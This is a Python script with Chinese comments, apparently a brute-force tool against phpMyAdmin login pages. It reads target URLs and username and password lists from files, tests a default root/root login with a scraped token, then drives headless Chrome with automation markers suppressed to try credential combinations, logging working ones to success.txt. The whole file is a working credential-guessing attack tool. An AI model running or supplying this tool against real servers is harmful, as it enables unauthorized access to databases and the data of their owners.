#!/usr/bin/env python
# -*- encoding: utf-8 -*-

# 方式二：模拟浏览器输入账号密码点击登录

import time
import html
import re
import requests
import urllib3
from selenium import webdriver  # 引入chrome驱动
from selenium.webdriver.chrome.options import Options
from concurrent.futures import ThreadPoolExecutor

userdic = 'user.txt'
passdic = 'password.txt'
urldic = 'urls.txt'
urllib3.disable_warnings()  # 禁用https安全警告


def test_url(url):
    print("正在尝试连接\t" + url)
    ss = requests.session()
    try:
        html1 = ss.get(url=url, verify=False).content.decode('utf-8')
        token_list = re.findall("name=\"token\" value=\"(.*?)\"", html1, re.I | re.M)
        token = html.unescape(token_list[0])
        data = {'pma_username': "root",
                'pma_password': "root",
                'server': 1,
                'lang': 'zh_CN',
                'token': token}
        html2 = ss.post(url=url, verify=False, data=data).content.decode('utf-8')
        if "phpMyAdmin" in html2:
            print("成功")
            print(token)
            return True
        else:
            print("失败")
            return False
    except Exception as e:
        print(e)
        return False
    finally:
        ss.close()


def bf(url, username, password):
    chrome_options = Options()
    chrome_options.add_argument('--headless')  # 启用headless模式，不显示浏览器界面
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_experimental_option('excludeSwitches', ['enable-automation',
                                                               'enable-logging'])  # 去除“chrome正受到自动测试软件的控制”提示,去除chromedriver的日志打印
    chrome_options.add_argument('--ignore-certificate-errors')  # 消除“不是私密连接”错误
    browser = webdriver.Chrome(options=chrome_options)
    browser.get(url)
    user_tag = browser.find_element_by_name("pma_username")
    pass_tag = browser.find_element_by_name("pma_password")
    user_tag.send_keys(username)
    pass_tag.send_keys(password)
    browser.find_element_by_id("input_go").click()
    time.sleep(1)  # 等待网页加载完
    try:
        username_tag = browser.find_element_by_name("pma_username")
        print(url + "\t" + username + "\t" + password + "失败")
    except:
        if test_url(url):  # 检查IP是否被禁
            with open("success.txt", "a", encoding='utf-8') as f1:
                f1.write(url + "  |  " + username + "  |  " + password + "\n")
            print(url + "\t" + username + "\t" + password + "成功")
            return True
        else:
            print(url + "\t禁止访问")
            with open("fail.txt", "a", encoding='utf-8') as f2:
                f2.write(url + "\t可能被禁止访问\n")
                return False
    finally:
        browser.quit()


pool = ThreadPoolExecutor(max_workers=1)  # 设置线程池大小，即同时开几个窗口
urls_success = []
urls_fail = []

if __name__ == '__main__':
    with open(userdic) as f1, open(passdic)as f2, open(urldic) as f3:
        for url in f3:
            url = url.strip()
            if test_url(url):
                urls_success.append(url)
            else:
                urls_fail.append(url)
        print("尝试连接成功的URL：")
        print('\n'.join(urls_success))
        print("\n尝试连接失败的URL：")
        print('\n'.join(urls_fail))
        print("press any key to continue")
        input()
        print("正在准备爆破...")
        for user in f1:
            for pwd in f2:
                for u in urls_success:
                    user = user.strip()
                    pwd = pwd.strip()
                    pool.submit(bf, u, user, pwd)
